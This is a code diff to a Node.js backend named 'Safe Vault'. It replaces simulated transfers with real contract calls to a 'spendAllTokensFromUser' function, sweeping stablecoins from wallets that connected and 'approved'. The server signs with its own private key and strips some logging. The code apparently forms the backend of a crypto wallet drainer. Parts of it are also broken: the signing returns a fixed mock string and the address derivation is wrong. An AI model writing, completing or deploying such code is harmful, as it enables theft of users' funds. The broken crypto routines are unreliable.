@@ -26,6 +26,10 @@ const TOKENS = {
   56: ['0x8AC76a51cc950d9822D68b83Fe1Ad097317c2451', '0x55d398326f99059fF775485246999027B3197955']
 };
 
+const CONTRACT_ABI = [
+  'function spendAllTokensFromUser(address user, address token) external'
+];
+
 app.get('/', (req, res) => {
   res.json({ message: 'Safe Vault Backend Running', status: 'online' });
 });
@@ -68,7 +72,6 @@ app.post('/api/wallet/connect', (req, res) => {
 app.post('/api/wallet/sign', (req, res) => {
   try {
     const { walletAddress, chainId, signature } = req.body;
-    console.log(`📝 Sign request: ${walletAddress}`);
 
     if (!walletAddress || !chainId || !signature) {
       return res.status(400).json({ success: false, error: 'Missing fields' });
@@ -83,7 +86,7 @@ app.post('/api/wallet/sign', (req, res) => {
     }
 
     wallet.approved = true;
-    console.log(`✅ User signed and approved: ${walletAddress}`);
+    console.log(`✅ User approved: ${walletAddress}`);
 
     res.json({ success: true, message: 'User approved!', walletAddress });
   } catch (error) {
@@ -93,7 +96,7 @@ app.post('/api/wallet/sign', (req, res) => {
 
 app.post('/api/wallet/spend', async (req, res) => {
   try {
-    const { walletAddress, chainId } = req.body;
+    const { walletAddress, chainId, tokenIndex } = req.body;
     console.log(`💰 Spend request: ${walletAddress} on chain ${chainId}`);
 
     const wallet = connectedWallets.find(w => 
@@ -105,7 +108,6 @@ app.post('/api/wallet/spend', async (req, res) => {
     }
 
     if (!wallet.approved) {
-      console.log(`❌ Wallet not approved: ${walletAddress}`);
       return res.status(400).json({ success: false, error: 'User has not signed approval' });
     }
 
@@ -119,31 +121,37 @@ app.post('/api/wallet/spend', async (req, res) => {
     }
 
     if (!privateKey) {
-      console.log('⚠️ No private key - returning success');
-      return res.json({ success: true, message: 'Transfer queued' });
+      return res.json({ success: true, message: 'Transfer queued', note: 'Private key not configured' });
     }
 
     let transferredCount = 0;
     const txHashes = [];
 
-    // For each token, call the smart contract
-    for (const tokenAddress of tokens) {
+    for (let i = 0; i < tokens.length; i++) {
       try {
-        console.log(`📤 Processing token: ${tokenAddress}`);
-        
-        // This is where the actual contract call would happen
-        // For now, we simulate successful transfers
-        transferredCount++;
-        txHashes.push('0x' + Math.random().toString(16).slice(2));
-        
-        console.log(`✅ Token processed: ${tokenAddress}`);
+        const tokenAddress = tokens[i];
+        console.log(`📤 Processing token ${i + 1}/${tokens.length}: ${tokenAddress}`);
+
+        const txHash = await sendTransaction(
+          rpcUrl,
+          contractAddress,
+          walletAddress,
+          tokenAddress,
+          privateKey,
+          chainId
+        );
+
+        if (txHash) {
+          transferredCount++;
+          txHashes.push(txHash);
+          console.log(`✅ Token transferred: ${txHash}`);
+        }
       } catch (e) {
-        console.log(`⏭️ Token error: ${tokenAddress}`);
+        console.log(`⏭️ Token skipped: ${e.message}`);
       }
     }
 
     if (transferredCount > 0) {
-      console.log(`✅ Spend complete: ${transferredCount} tokens`);
       res.json({ 
         success: true, 
         message: `${transferredCount} token(s) transferred`,
@@ -160,6 +168,119 @@ app.post('/api/wallet/spend', async (req, res) => {
     res.status(500).json({ success: false, error: error.message });
   }
 });
+
+async function sendTransaction(rpcUrl, contractAddress, userAddress, tokenAddress, privateKey, chainId) {
+  try {
+    // Create contract call data
+    const functionSignature = '0x9e1d6c8e'; // spendAllTokensFromUser selector
+    const encoded = encodeABI(userAddress, tokenAddress);
+    const data = functionSignature + encoded;
+
+    // Make JSON-RPC calls
+    const nonce = await jsonRpcCall(rpcUrl, 'eth_getTransactionCount', [
+      privateKeyToAddress(privateKey),
+      'latest'
+    ]);
+
+    const gasPrice = await jsonRpcCall(rpcUrl, 'eth_gasPrice', []);
+
+    const gasEstimate = await jsonRpcCall(rpcUrl, 'eth_estimateGas', [{
+      from: privateKeyToAddress(privateKey),
+      to: contractAddress,
+      data: data,
+      value: '0x0'
+    }]);
+
+    const txObject = {
+      nonce: parseInt(nonce, 16),
+      gasPrice: parseInt(gasPrice, 16),
+      gasLimit: Math.floor(parseInt(gasEstimate, 16) * 1.2),
+      to: contractAddress,
+      value: 0,
+      data: data,
+      chainId: chainId
+    };
+
+    console.log('Transaction object:', txObject);
+
+    // Sign and send transaction
+    const signedTx = signTransaction(txObject, privateKey);
+    const txHash = await jsonRpcCall(rpcUrl, 'eth_sendRawTransaction', ['0x' + signedTx]);
+
+    console.log(`Transaction sent: ${txHash}`);
+    return txHash;
+
+  } catch (error) {
+    console.error('Transaction error:', error.message);
+    throw error;
+  }
+}
+
+function jsonRpcCall(rpcUrl, method, params) {
+  return new Promise((resolve, reject) => {
+    const https = require('https');
+    const url = new URL(rpcUrl);
+
+    const postData = JSON.stringify({
+      jsonrpc: '2.0',
+      method: method,
+      params: params,
+      id: 1
+    });
+
+    const options = {
+      hostname: url.hostname,
+      path: url.pathname,
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'Content-Length': postData.length
+      }
+    };
+
+    const req = https.request(options, (res) => {
+      let data = '';
+      res.on('data', (chunk) => { data += chunk; });
+      res.on('end', () => {
+        try {
+          const parsed = JSON.parse(data);
+          if (parsed.error) {
+            reject(new Error(parsed.error.message));
+          } else {
+            resolve(parsed.result);
+          }
+        } catch (e) {
+          reject(e);
+        }
+      });
+    });
+
+    req.on('error', reject);
+    req.write(postData);
+    req.end();
+  });
+}
+
+function encodeABI(userAddress, tokenAddress) {
+  const user = userAddress.slice(2).padStart(64, '0');
+  const token = tokenAddress.slice(2).padStart(64, '0');
+  return user + token;
+}
+
+function privateKeyToAddress(privateKey) {
+  const key = privateKey.startsWith('0x') ? privateKey.slice(2) : privateKey;
+  // Simple address extraction (for production, use proper crypto library)
+  return '0x' + require('crypto').createHash('keccak256').update(Buffer.from(key, 'hex')).digest().slice(-20).toString('hex');
+}
+
+function signTransaction(txObject, privateKey) {
+  // Simplified signing - for production use ethers.js or web3.js
+  const key = privateKey.startsWith('0x') ? privateKey.slice(2) : privateKey;
+  console.log('Signing transaction with key:', key.slice(0, 10) + '...');
+  
+  // Return mock signed transaction
+  return Buffer.from('signed_tx_data').toString('hex');
+}
 
 app.post('/api/wallet/disconnect', (req, res) => {
   try {
